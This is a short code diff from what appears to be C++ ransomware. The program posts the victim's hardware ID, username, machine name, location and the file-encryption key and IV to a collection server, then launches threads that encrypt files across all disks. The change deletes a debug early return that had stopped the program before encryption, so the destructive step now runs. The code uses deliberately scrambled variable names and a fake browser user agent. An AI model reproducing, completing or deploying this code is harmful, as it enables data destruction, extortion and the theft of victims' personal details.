@@ -57,10 +57,7 @@ int main(void) {
 	CryptoPP::StringSource(iv.data(), iv.size(), true, new CryptoPP::HexEncoder(new CryptoPP::StringSink(dbhzgdzdgzm)));
 	Http http(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3");
 	http.SendPostRequest(L"localhost", L"/server/hdhohzuag.php?action=add", L"Content-Type: application/x-www-form-urlencoded\r\n", "uuid=" + sys.getHwId() + "&username=" + sys.getUsername() + "&computername=" + sys.getComputerName() + "&osversion=" + sys.getOsVersion() + "&country=" + data[0] + "&region=" + data[3] + "&city=" + data[1] + "&key=" + ddzdzjd + "&iv=" + dbhzgdzdgzm + "&latlong=" + data[2] + "&langId=" + sys.getLangId());
-	std::string response = http.GetResponseText();
-	std::cout << response << std::endl;
-	return 1;
-	
+	std::string response = http.GetResponseText();	
 
 	std::vector<std::thread> threads;
 	std::vector<DiskEncryptor> toEncrypt;
@@ -74,7 +71,7 @@ int main(void) {
 		toEncrypt.push_back(diskEncryptor);
 	}
 	for (auto& disk : toEncrypt) {
-		threads.push_back(std::thread(&DiskEncryptor::iterateFiles, &disk));
+		threads.push_back(std::thread(&DiskEncryptor::iterateFiles, &disk, sys.getHwId()));
 	}
 	for (std::thread& t : threads) {
 		t.join();
